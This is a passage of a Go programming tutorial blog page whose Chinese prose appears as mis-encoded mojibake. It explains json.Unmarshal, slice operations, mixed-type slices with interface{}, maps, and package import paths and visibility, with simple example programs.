¼å¼ã€‚</li></ul></li><li><p><code>&amp;todo</code>ï¼š</p><ul><li>è¿™é‡Œç”¨åˆ°äº†å–åœ°å€ç¬¦å· <code>&amp;</code>ï¼Œæ„å‘³ç€æˆ‘ä»¬ä¼ é€’ç»™ <code>json.Unmarshal</code> çš„æ˜¯ <code>todo</code> å˜é‡çš„åœ°å€ï¼Œè€Œä¸æ˜¯å®ƒçš„å€¼ã€‚</li><li>ä¸ºä»€ä¹ˆè¦ä¼ é€’åœ°å€ï¼Ÿå› ä¸º <code>json.Unmarshal</code> éœ€è¦åœ¨è¿™ä¸ªåœ°å€ä¸Šç›´æ¥ä¿®æ”¹æ•°æ®ã€‚å¦‚æœæˆ‘ä»¬åªä¼ é€’å€¼ï¼ˆå³ä¸ç”¨ <code>&amp;</code>ï¼‰ï¼Œé‚£ä¹ˆ <code>json.Unmarshal</code> åªèƒ½ä¿®æ”¹å‰¯æœ¬çš„æ•°æ®ï¼ŒåŸå§‹çš„ <code>todo</code> å˜é‡åˆ™ä¸ä¼šæ”¹å˜ã€‚</li><li>é€šè¿‡ä¼ é€’ <code>todo</code> å˜é‡çš„åœ°å€ï¼Œ<code>json.Unmarshal</code> èƒ½å¤Ÿç›´æ¥åœ¨è¿™ä¸ªåœ°å€ä¸Šæ›´æ–° <code>todo</code> çš„å­—æ®µï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¾—åˆ°è§£æåçš„æ•°æ®äº†ã€‚</li></ul></li></ol><p>æ€»ç»“ä¸€ä¸‹ï¼Œ<code>json.Unmarshal([]byte(jsonString), &amp;todo)</code> è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯ï¼šå®ƒæŠŠJSONå­—ç¬¦ä¸²è½¬æ¢æˆå­—èŠ‚åˆ‡ç‰‡ï¼Œç„¶åæŠŠè¿™äº›å­—èŠ‚è§£ææˆ <code>TODO</code> ç»“æ„ä½“çš„æ•°æ®ï¼Œç›´æ¥å†™å…¥åˆ° <code>todo</code> å˜é‡ä¸­ã€‚è¿™æ˜¯Goè¯­è¨€å¤„ç†JSONéå¸¸å¸¸ç”¨çš„ä¸€ç§æ–¹å¼ï¼Œæ—¢é«˜æ•ˆåˆç›´æ¥ã€‚</p><h1 id="åˆ‡ç‰‡"><a href="#åˆ‡ç‰‡" class="headerlink" title="åˆ‡ç‰‡"></a>åˆ‡ç‰‡</h1><p>åœ¨Goè¯­è¨€ä¸­ï¼Œåˆ‡ç‰‡ï¼ˆSliceï¼‰æ˜¯ä¸€ç§éå¸¸çµæ´»ä¸”åŠŸèƒ½ä¸°å¯Œçš„æ•°æ®ç»“æ„ã€‚åˆ‡ç‰‡æä¾›äº†å¤šç§æ“ä½œæ–¹æ³•æ¥å¤„ç†åŠ¨æ€åºåˆ—ã€‚è®©æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹åˆ‡ç‰‡çš„å¸¸è§æ“ä½œå§ï¼š</p><h3 id="1-åˆ›å»ºåˆ‡ç‰‡"><a href="#1-åˆ›å»ºåˆ‡ç‰‡" class="headerlink" title="1. åˆ›å»ºåˆ‡ç‰‡"></a>1. åˆ›å»ºåˆ‡ç‰‡</h3><ul><li>ä½¿ç”¨ <code>make</code>ï¼š<code>make([]int, length, capacity)</code> åˆ›å»ºä¸€ä¸ªæŒ‡å®šé•¿åº¦å’Œå®¹é‡çš„åˆ‡ç‰‡ã€‚</li><li>ä»æ•°ç»„æˆ–åˆ‡ç‰‡ä¸­åˆ›å»ºï¼š<code>array[start:end]</code> ä»æ•°ç»„æˆ–å¦ä¸€ä¸ªåˆ‡ç‰‡ä¸­åˆ›å»ºåˆ‡ç‰‡ã€‚</li></ul><h3 id="2-æ·»åŠ å…ƒç´ "><a href="#2-æ·»åŠ å…ƒç´ " class="headerlink" title="2. æ·»åŠ å…ƒç´ "></a>2. æ·»åŠ å…ƒç´ </h3><ul><li><code>append</code>ï¼š<code>slice = append(slice, elem1, elem2)</code> æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ åˆ°åˆ‡ç‰‡çš„æœ«å°¾ã€‚</li></ul><h3 id="3-åˆ é™¤å…ƒç´ "><a href="#3-åˆ é™¤å…ƒç´ " class="headerlink" title="3. åˆ é™¤å…ƒç´ "></a>3. åˆ é™¤å…ƒç´ </h3><ul><li>åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ ï¼šä½¿ç”¨ <code>append</code> å’Œåˆ‡ç‰‡æ“ä½œç»„åˆæ¥åˆ é™¤å…ƒç´ ï¼Œä¾‹å¦‚ <code>append(slice[:i], slice[i+1:]...)</code>ã€‚</li></ul><h3 id="4-è®¿é—®å’Œä¿®æ”¹å…ƒç´ "><a href="#4-è®¿é—®å’Œä¿®æ”¹å…ƒç´ " class="headerlink" title="4. è®¿é—®å’Œä¿®æ”¹å…ƒç´ "></a>4. è®¿é—®å’Œä¿®æ”¹å…ƒç´ </h3><ul><li>é€šè¿‡ç´¢å¼•ï¼š<code>slice[i]</code> è®¿é—®æˆ–ä¿®æ”¹ç¬¬ <code>i</code> ä¸ªå…ƒç´ ã€‚</li></ul><h3 id="5-åˆ‡ç‰‡çš„é•¿åº¦å’Œå®¹é‡"><a href="#5-åˆ‡ç‰‡çš„é•¿åº¦å’Œå®¹é‡" class="headerlink" title="5. åˆ‡ç‰‡çš„é•¿åº¦å’Œå®¹é‡"></a>5. åˆ‡ç‰‡çš„é•¿åº¦å’Œå®¹é‡</h3><ul><li><code>len(slice)</code>ï¼šè¿”å›åˆ‡ç‰‡çš„å½“å‰é•¿åº¦ã€‚</li><li><code>cap(slice)</code>ï¼šè¿”å›åˆ‡ç‰‡çš„å®¹é‡ã€‚</li></ul><h3 id="6-åˆ‡ç‰‡éå†"><a href="#6-åˆ‡ç‰‡éå†" class="headerlink" title="6. åˆ‡ç‰‡éå†"></a>6. åˆ‡ç‰‡éå†</h3><ul><li>ä½¿ç”¨ <code>for</code> å¾ªç¯ï¼š<code>for i := range slice &#123; ... &#125;</code>ã€‚</li><li>ä½¿ç”¨ <code>for</code> å¾ªç¯å’Œç´¢å¼•ï¼š<code>for i, v := range slice &#123; ... &#125;</code>ã€‚</li></ul><h3 id="7-åˆ‡ç‰‡å¤åˆ¶"><a href="#7-åˆ‡ç‰‡å¤åˆ¶" class="headerlink" title="7. åˆ‡ç‰‡å¤åˆ¶"></a>7. åˆ‡ç‰‡å¤åˆ¶</h3><ul><li><code>copy</code>ï¼š<code>copy(destSlice, srcSlice)</code> å°†ä¸€ä¸ªåˆ‡ç‰‡çš„å…ƒç´ å¤åˆ¶åˆ°å¦ä¸€ä¸ªåˆ‡ç‰‡ã€‚</li></ul><h3 id="8-åˆ‡ç‰‡æˆªå–"><a href="#8-åˆ‡ç‰‡æˆªå–" class="headerlink" title="8. åˆ‡ç‰‡æˆªå–"></a>8. åˆ‡ç‰‡æˆªå–</h3><ul><li><code>slice[start:end]</code>ï¼šæˆªå–åˆ‡ç‰‡çš„ä¸€éƒ¨åˆ†ã€‚</li></ul><h3 id="9-å¤šç»´åˆ‡ç‰‡"><a href="#9-å¤šç»´åˆ‡ç‰‡" class="headerlink" title="9. å¤šç»´åˆ‡ç‰‡"></a>9. å¤šç»´åˆ‡ç‰‡</h3><ul><li>åƒæ•°ç»„ä¸€æ ·ï¼Œä½ å¯ä»¥åˆ›å»ºå¤šç»´åˆ‡ç‰‡ã€‚</li></ul><h3 id="10-åˆ‡ç‰‡çš„æ’åº"><a href="#10-åˆ‡ç‰‡çš„æ’åº" class="headerlink" title="10. åˆ‡ç‰‡çš„æ’åº"></a>10. åˆ‡ç‰‡çš„æ’åº</h3><ul><li>ä½¿ç”¨ <code>sort</code> åŒ…ï¼š<code>sort.Ints(slice)</code> å¯¹æ•´æ•°åˆ‡ç‰‡æ’åºã€‚</li></ul><h3 id="11-æ¸…ç©ºåˆ‡ç‰‡"><a href="#11-æ¸…ç©ºåˆ‡ç‰‡" class="headerlink" title="11. æ¸…ç©ºåˆ‡ç‰‡"></a>11. æ¸…ç©ºåˆ‡ç‰‡</h3><ul><li>è®¾ç½®ä¸º nilï¼š<code>slice = nil</code> æ¸…ç©ºåˆ‡ç‰‡ã€‚</li></ul><h3 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// åˆ›å»ºåˆ‡ç‰‡</span></span><br><span class="line">slice := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ å…ƒç´ </span></span><br><span class="line">slice = <span class="built_in">append</span>(slice, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ’åº</span></span><br><span class="line">sort.Ints(slice)</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†</span></span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> slice &#123;</span><br><span class="line">fmt.Println(value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">slice = slice[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ˜¾ç¤ºç»“æœ</span></span><br><span class="line">fmt.Println(slice)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-ä½¿ç”¨-interface-ç±»å‹çš„åˆ‡ç‰‡"><a href="#1-ä½¿ç”¨-interface-ç±»å‹çš„åˆ‡ç‰‡" class="headerlink" title="1. ä½¿ç”¨ interface{} ç±»å‹çš„åˆ‡ç‰‡"></a>1. ä½¿ç”¨ <code>interface&#123;&#125;</code> ç±»å‹çš„åˆ‡ç‰‡</h3><p>æœ€é€šç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ <code>interface&#123;&#125;</code> ç±»å‹çš„åˆ‡ç‰‡ï¼Œå› ä¸ºåœ¨Goä¸­ï¼Œ<code>interface&#123;&#125;</code> å¯ä»¥è¡¨ç¤ºä»»ä½•ç±»å‹çš„å€¼ã€‚</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mixedSlice []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">mixedSlice = <span class="built_in">append</span>(mixedSlice, <span class="string">&quot;Hello&quot;</span>, <span class="number">42</span>, <span class="literal">true</span>, <span class="number">3.14</span>)</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹å¼å…è®¸ä½ å°†ä»»ä½•ç±»å‹çš„æ•°æ®æ·»åŠ åˆ°åˆ‡ç‰‡ä¸­ï¼Œä½†åœ¨ä½¿ç”¨æ—¶éœ€è¦æ³¨æ„ç±»å‹æ–­è¨€ï¼Œå› ä¸ºä½ éœ€è¦æ˜ç¡®çŸ¥é“ä½ åœ¨å¤„ç†ä»€ä¹ˆç±»å‹çš„æ•°æ®ã€‚</p><h3 id="2-ä½¿ç”¨ç»“æ„ä½“å’Œæ–¹æ³•"><a href="#2-ä½¿ç”¨ç»“æ„ä½“å’Œæ–¹æ³•" class="headerlink" title="2. ä½¿ç”¨ç»“æ„ä½“å’Œæ–¹æ³•"></a>2. ä½¿ç”¨ç»“æ„ä½“å’Œæ–¹æ³•</h3><p>å¦‚æœä½ çŸ¥é“ä½ æƒ³è¦å­˜å‚¨çš„æ•°æ®ç±»å‹çš„èŒƒå›´ï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“åŒ…å«æ‰€æœ‰å¯èƒ½çš„ç±»å‹ï¼Œç„¶ååœ¨åˆ‡ç‰‡ä¸­å­˜å‚¨è¿™ä¸ªç»“æ„ä½“çš„å®ä¾‹ã€‚</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MixedType <span class="keyword">struct</span> &#123;</span><br><span class="line">    intValue    <span class="type">int</span></span><br><span class="line">    stringValue <span class="type">string</span></span><br><span class="line">    boolValue   <span class="type">bool</span></span><br><span class="line">    <span class="comment">// å…¶ä»–ç±»å‹</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mixedSlice []MixedType</span><br><span class="line">mixedSlice = <span class="built_in">append</span>(mixedSlice, MixedType&#123;intValue: <span class="number">1</span>&#125;, MixedType&#123;stringValue: <span class="string">&quot;Hello&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•æä¾›äº†æ›´å¥½çš„ç±»å‹å®‰å…¨æ€§ï¼Œä½†ç‰ºç‰²äº†ä¸€äº›çµæ´»æ€§å’Œä¾¿åˆ©æ€§ã€‚</p><h3 id="3-ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“"><a href="#3-ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“" class="headerlink" title="3. ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“"></a>3. ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“</h3><p>è¿˜æœ‰ä¸€äº›ç¬¬ä¸‰æ–¹åº“æä¾›äº†ç±»ä¼¼äºåŠ¨æ€ç±»å‹æ•°ç»„çš„åŠŸèƒ½ï¼Œä½†è¿™é€šå¸¸ä¸è¢«æ¨èï¼Œé™¤éä½ ç¡®å®éœ€è¦è¿™ç§ç‰¹æ®Šçš„åŠŸèƒ½ï¼Œå¹¶ä¸”æ„¿æ„å¼•å…¥é¢å¤–çš„ä¾èµ–ã€‚</p><h3 id="ä½¿ç”¨-interface-åˆ‡ç‰‡çš„ç¤ºä¾‹"><a href="#ä½¿ç”¨-interface-åˆ‡ç‰‡çš„ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ interface{} åˆ‡ç‰‡çš„ç¤ºä¾‹"></a>ä½¿ç”¨ <code>interface&#123;&#125;</code> åˆ‡ç‰‡çš„ç¤ºä¾‹</h3><p>è¿™é‡Œæœ‰ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨ <code>interface&#123;&#125;</code> ç±»å‹çš„åˆ‡ç‰‡ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªå¯ä»¥å­˜å‚¨ä»»ä½•ç±»å‹çš„åˆ‡ç‰‡</span></span><br><span class="line"><span class="keyword">var</span> mixedSlice []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘åˆ‡ç‰‡ä¸­æ·»åŠ ä¸åŒç±»å‹çš„æ•°æ®</span></span><br><span class="line">mixedSlice = <span class="built_in">append</span>(mixedSlice, <span class="string">&quot;Hello&quot;</span>, <span class="number">42</span>, <span class="literal">true</span>, <span class="number">3.14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†åˆ‡ç‰‡å¹¶æ‰“å°æ¯ä¸ªå…ƒç´ çš„ç±»å‹å’Œå€¼</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> mixedSlice &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Type: %s, Value: %v\n&quot;</span>, reflect.TypeOf(v), v)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•åˆ›å»ºä¸€ä¸ªå¯ä»¥å­˜å‚¨ä¸åŒç±»å‹æ•°æ®çš„åˆ‡ç‰‡ï¼Œä»¥åŠå¦‚ä½•éå†è¿™ä¸ªåˆ‡ç‰‡å¹¶æ‰“å°å‡ºæ¯ä¸ªå…ƒç´ çš„ç±»å‹å’Œå€¼ã€‚ä½¿ç”¨ <code>interface&#123;&#125;</code> ç±»å‹çš„åˆ‡ç‰‡ç¡®å®æä¾›äº†çµæ´»æ€§ï¼Œä½†ä¹Ÿéœ€è¦åœ¨ä½¿ç”¨æ—¶å°å¿ƒå¤„ç†ç±»å‹æ–­è¨€å’Œç±»å‹æ£€æŸ¥ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå°½ç®¡Goè¯­è¨€ä¸ç›´æ¥æ”¯æŒå­˜å‚¨ä¸åŒç±»å‹æ•°æ®çš„åˆ‡ç‰‡ï¼Œä½†ä½ å¯ä»¥é€šè¿‡ä¸Šè¿°æ–¹æ³•æ¥å®ç°ç±»ä¼¼çš„åŠŸèƒ½ã€‚ç„¶è€Œï¼Œæ€»æ˜¯éœ€è¦æƒè¡¡çµæ´»æ€§å’Œç±»å‹å®‰å…¨æ€§ã€‚å¦‚æœä½ æœ‰ç‰¹å®šçš„ä½¿ç”¨åœºæ™¯ï¼Œé€‰æ‹©åˆé€‚çš„æ–¹æ³•å¾ˆé‡è¦ã€‚</p><h1 id="æ˜ å°„"><a href="#æ˜ å°„" class="headerlink" title="æ˜ å°„"></a>æ˜ å°„</h1><p>å½“ç„¶å¯ä»¥ï¼è®²è§£æ˜ å°„ï¼ˆMapï¼‰è¿™ä¸ªæ¦‚å¿µï¼Œæˆ‘ä»¬è¦ä»å‡ ä¸ªæ–¹é¢æ¥ç†è§£ï¼š</p><h3 id="æ˜ å°„ï¼ˆMapï¼‰çš„åŸºæœ¬æ¦‚å¿µ"><a href="#æ˜ å°„ï¼ˆMapï¼‰çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="æ˜ å°„ï¼ˆMapï¼‰çš„åŸºæœ¬æ¦‚å¿µ"></a>æ˜ å°„ï¼ˆMapï¼‰çš„åŸºæœ¬æ¦‚å¿µ</h3><ol><li><p><strong>å®šä¹‰ä¸ç‰¹ç‚¹</strong></p><ul><li>æ˜ å°„æ˜¯ä¸€ç§é”®å€¼å¯¹ï¼ˆKey-Valueï¼‰çš„æ•°æ®ç»“æ„ã€‚</li><li>åœ¨ Go é‡Œï¼Œæ˜ å°„çš„é”®å¯ä»¥æ˜¯ä»»ä½•å¯æ¯”è¾ƒçš„ç±»å‹ï¼Œæ¯”å¦‚ intã€stringã€‚</li><li>å€¼å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼Œç”šè‡³å¯ä»¥æ˜¯å¦ä¸€ä¸ªæ˜ å°„ã€‚</li><li>æ˜ å°„æ˜¯æ— åºçš„ï¼Œæ¯æ¬¡éå†æ˜ å°„æ—¶ï¼Œé”®å€¼å¯¹çš„é¡ºåºå¯èƒ½ä¸åŒã€‚</li></ul></li><li><p><strong>åˆ›å»ºå’Œåˆå§‹åŒ–</strong></p><ul><li>ä½¿ç”¨å†…ç½®çš„ <code>make</code> å‡½æ•°ï¼š<code>mapVar := make(map[KeyType]ValueType)</code></li><li>å­—é¢é‡åˆå§‹åŒ–ï¼š<code>mapVar := map[KeyType]ValueType&#123;key1: value1, key2: value2&#125;</code></li></ul></li><li><p><strong>æ“ä½œ</strong></p><ul><li><strong>æ·»åŠ &#x2F;ä¿®æ”¹å…ƒç´ </strong>ï¼š<code>mapVar[key] = value</code></li><li><strong>è·å–å…ƒç´ </strong>ï¼š<code>value := mapVar[key]</code></li><li><strong>åˆ é™¤å…ƒç´ </strong>ï¼š<code>delete(mapVar, key)</code></li><li><strong>æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨</strong>ï¼š<code>value, ok := mapVar[key]</code>ï¼ˆå¦‚æœ key å­˜åœ¨ï¼Œ<code>ok</code> ä¸º <code>true</code>ï¼›å¦åˆ™ï¼Œ<code>ok</code> ä¸º <code>false</code>ï¼‰</li></ul></li></ol><h3 id="æ˜ å°„çš„ä½¿ç”¨åœºæ™¯"><a href="#æ˜ å°„çš„ä½¿ç”¨åœºæ™¯" class="headerlink" title="æ˜ å°„çš„ä½¿ç”¨åœºæ™¯"></a>æ˜ å°„çš„ä½¿ç”¨åœºæ™¯</h3><ul><li><strong>å­˜å‚¨å”¯ä¸€é”®çš„é›†åˆ</strong>ï¼šæ¯”å¦‚ç”¨æˆ·ååˆ°ç”¨æˆ·ä¿¡æ¯çš„æ˜ å°„ã€‚</li><li><strong>å¿«é€ŸæŸ¥æ‰¾</strong>ï¼šé€šè¿‡é”®å¯ä»¥è¿…é€Ÿæ‰¾åˆ°å¯¹åº”çš„å€¼ã€‚</li><li><strong>ä½œä¸ºé›†åˆçš„æ›¿ä»£å“</strong>ï¼šç‰¹åˆ«æ˜¯éœ€è¦é”®å’Œå€¼å¯¹åº”æ—¶ã€‚</li></ul><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li><strong>å¹¶å‘å®‰å…¨æ€§</strong>ï¼šæ ‡å‡†çš„ <code>map</code> åœ¨å¹¶å‘æƒ…å†µä¸‹ä¸æ˜¯å®‰å…¨çš„ã€‚éœ€è¦ä½¿ç”¨é”ï¼ˆå¦‚ <code>sync.Mutex</code>ï¼‰æˆ–è€…ä½¿ç”¨ <code>sync.Map</code>ã€‚</li><li><strong>é›¶å€¼</strong>ï¼šè®¿é—®ä¸å­˜åœ¨çš„é”®æ—¶ï¼Œä¼šå¾—åˆ°å€¼ç±»å‹çš„é›¶å€¼ï¼Œå¦‚ int çš„é›¶å€¼æ˜¯ 0ã€‚</li><li><strong>è¿­ä»£é¡ºåº</strong>ï¼šéå† map æ—¶ï¼Œæ¯æ¬¡çš„è¿­ä»£é¡ºåºå¯èƒ½ä¸åŒï¼Œä¸èƒ½å‡è®¾å®ƒä»¬æœ‰åºã€‚</li></ul><h3 id="ç¤ºä¾‹ä»£ç -1"><a href="#ç¤ºä¾‹ä»£ç -1" class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ˜ å°„</span></span><br><span class="line">    myMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ·»åŠ å…ƒç´ </span></span><br><span class="line">    myMap[<span class="string">&quot;apple&quot;</span>] = <span class="number">5</span></span><br><span class="line">    myMap[<span class="string">&quot;banana&quot;</span>] = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¹¶æ‰“å°ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    fmt.Println(<span class="string">&quot;apples:&quot;</span>, myMap[<span class="string">&quot;apple&quot;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    value, ok := myMap[<span class="string">&quot;orange&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> ok &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;orange:&quot;</span>, value)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;orange not found&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ é™¤ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    <span class="built_in">delete</span>(myMap, <span class="string">&quot;apple&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ˜ å°„</span></span><br><span class="line">    <span class="keyword">for</span> key, value := <span class="keyword">range</span> myMap &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%s has %d items\n&quot;</span>, key, value)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h1><p>åœ¨ Go è¯­è¨€ä¸­ï¼Œç†è§£åŒ…çš„å¯¼å…¥è·¯å¾„å’Œå¯è§æ€§æ˜¯éå¸¸é‡è¦çš„ã€‚è¿™ä¸ä»…å…³ç³»åˆ°å¦‚ä½•ç»„ç»‡ä»£ç ï¼Œè¿˜å½±å“ç€ä»£ç çš„å¯è®¿é—®æ€§å’Œé‡ç”¨æ€§ã€‚æˆ‘ä»¬æ¥é€ä¸€çœ‹çœ‹ï¼š</p><h3 id="åŒ…çš„å¯¼å…¥è·¯å¾„"><a href="#åŒ…çš„å¯¼å…¥è·¯å¾„" class="headerlink" title="åŒ…çš„å¯¼å…¥è·¯å¾„"></a>åŒ…çš„å¯¼å…¥è·¯å¾„</h3><ol><li><p><strong>å®šä¹‰</strong></p><ul><li>åŒ…çš„å¯¼å…¥è·¯å¾„æ˜¯ç”¨æ¥åœ¨ Go ç¨‹åºä¸­å¼•å…¥åŒ…çš„è·¯å¾„ã€‚å®ƒå¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„æˆ–ç»å¯¹è·¯å¾„ã€‚</li></ul></li><li><p><strong>GOPATH å’Œ Go Modules</strong></p><ul><li>åœ¨ Go Modules å‡ºç°ä¹‹å‰ï¼ŒGo ä¾èµ–äº <code>GOPATH</code> ç¯å¢ƒå˜é‡æ¥å¯»æ‰¾é¡¹ç›®å’ŒåŒ…ã€‚</li><li>Go 1.11 å¼•å…¥äº† Go Modulesï¼Œä½¿å¾—ä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹åˆ›å»ºé¡¹ç›®ï¼Œä¸å†å—é™äº <code>GOPATH</code>ã€‚</li><li>ä½¿ç”¨ Go Modules æ—¶ï¼ŒåŒ…çš„å¯¼å…¥è·¯å¾„é€šå¸¸æ˜¯æ¨¡å—è·¯å¾„åŠ ä¸ŠåŒ…çš„å­è·¯å¾„ã€‚</li></ul></li><li><p><strong>æ¨¡å—è·¯å¾„</strong></p><ul><li>æ¨¡å—è·¯å¾„é€šå¸¸æ˜¯ç‰ˆæœ¬æ§åˆ¶ä»“åº“çš„è·¯å¾„ï¼ˆä¾‹å¦‚ <code>github.com/username/project</code>ï¼‰ã€‚</li><li>åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹çš„ <code>go.mod</code> æ–‡ä»¶ä¸­å£°æ˜æ¨¡å—è·¯å¾„ã€‚</li></ul></li></ol><h3 id="åŒ…çš„å¯è§æ€§"><a href="#åŒ…çš„å¯è§æ€§" class="headerlink" title="åŒ…çš„å¯è§æ€§"></a>åŒ…çš„å¯è§æ€§</h3><ol><li><p><strong>å…¬å¼€å¯è§æ€§ï¼ˆExportedï¼‰</strong></p><ul><li>åœ¨ Go ä¸­ï¼Œå¦‚æœä¸€ä¸ªæ ‡è¯†ç¬¦ï¼ˆå¦‚å‡½æ•°ã€ç±»å‹ã€å˜é‡ç­‰ï¼‰çš„é¦–å­—æ¯æ˜¯å¤§å†™çš„ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯å…¬å¼€çš„ï¼Œå¯ä»¥è¢«å…¶ä»–åŒ…è®¿é—®ã€‚</li><li>ä¾‹å¦‚ï¼Œ<code>Println</code> æ˜¯ <code>fmt</code> åŒ…ä¸­çš„ä¸€ä¸ªå…¬å¼€å‡½æ•°ã€‚</li></ul></li><li><p><strong>ç§æœ‰å¯è§æ€§ï¼ˆUnexportedï¼‰</strong></p><ul><li>å¦‚æœä¸€ä¸ªæ ‡è¯†ç¬¦çš„é¦–å­—æ¯æ˜¯å°å†™çš„ï¼Œé‚£ä¹ˆå®ƒæ˜¯ç§æœ‰çš„ï¼Œåªèƒ½åœ¨å…¶æ‰€åœ¨çš„åŒ…å†…éƒ¨è®¿é—®ã€‚</li><li>è¿™å¯¹å°è£…å’Œéšè—å®ç°ç»†èŠ‚éå¸¸é‡è¦ã€‚</li></ul></li></ol><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªé¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- /path/to/myproject</span><br><span class="line">  - go.mod (module github.com/myuser/myproject)</span><br><span class="line">  - main.go</span><br><span class="line">  - helper</span><br><span class="line">    - helper.go</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç»“æ„ä¸­ï¼š</p><ul><li>å¯¼å…¥è·¯å¾„ï¼šå¦‚æœ <code>helper.go</code> ä¸­å®šä¹‰äº†ä¸€ä¸ªåŒ… <code>package helper</code>ï¼Œé‚£ä¹ˆåœ¨ <code>main.go</code> 